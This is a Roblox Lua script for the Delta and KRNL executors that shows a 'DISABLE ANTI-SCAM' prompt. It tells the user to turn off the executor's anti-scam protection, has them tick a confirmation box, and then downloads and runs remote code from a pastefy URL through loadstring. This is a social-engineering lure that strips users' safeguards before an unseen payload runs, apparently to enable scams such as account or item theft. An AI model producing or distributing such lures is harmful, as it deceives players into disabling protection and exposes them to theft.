--// Detect Executor
local executor = identifyexecutor and identifyexecutor():lower() or "unknown"

-- Show GUI only for Delta or KRNL users
if executor ~= "delta" and executor ~= "krnl" then
    return -- silently exit this UI logic
end

--// Roblox Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = "AntiScamPrompt"

-- Frame
local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 350, 0, 220)
frame.Position = UDim2.new(0.5, -175, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "DISABLE ANTI-SCAM"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

-- Description (Changes per executor)
local desc = Instance.new("TextLabel", frame)
desc.Position = UDim2.new(0, 0, 0, 60)
desc.Size = UDim2.new(1, 0, 0, 60)
desc.BackgroundTransparency = 1
desc.TextWrapped = true
desc.Text = executor == "krnl"
    and "Disable ANTI-SCAM in KRNL settings to ensure proper code functionality"
    or "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
desc.TextColor3 = Color3.fromRGB(255, 150, 150)
desc.Font = Enum.Font.Gotham
desc.TextSize = 16

-- Checkbox
local checkbox = Instance.new("TextButton", frame)
checkbox.Position = UDim2.new(0, 20, 0, 130)
checkbox.Size = UDim2.new(0, 24, 0, 24)
checkbox.Text = ""
checkbox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
checkbox.BorderColor3 = Color3.fromRGB(100, 100, 100)

local checked = false
checkbox.MouseButton1Click:Connect(function()
    checked = not checked
    checkbox.Text = checked and "âœ“" or ""
end)

-- Label next to checkbox
local label = Instance.new("TextLabel", frame)
label.Position = UDim2.new(0, 50, 0, 130)
label.Size = UDim2.new(1, -50, 0, 24)
label.BackgroundTransparency = 1
label.Text = "I already disabled ANTI SCAM"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.Gotham
label.TextSize = 16
label.TextXAlignment = Enum.TextXAlignment.Left

-- Proceed Button
local proceed = Instance.new("TextButton", frame)
proceed.Position = UDim2.new(0.5, -75, 1, -50)
proceed.Size = UDim2.new(0, 150, 0, 40)
proceed.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
proceed.Text = "PROCEED"
proceed.TextColor3 = Color3.fromRGB(255, 255, 255)
proceed.Font = Enum.Font.GothamBold
proceed.TextSize = 18

-- Proceed Logic
proceed.MouseButton1Click:Connect(function()
    if not checked then
        proceed.Text = "Please check the box"
        wait(1)
        proceed.Text = "PROCEED"
    else
        screenGui:Destroy()

        --// ðŸ”¥ Actual Script Starts Here ðŸ”¥
        loadstring(game:HttpGet("https://pastefy.app/vH8EsPvd/raw"))()
    end
end)
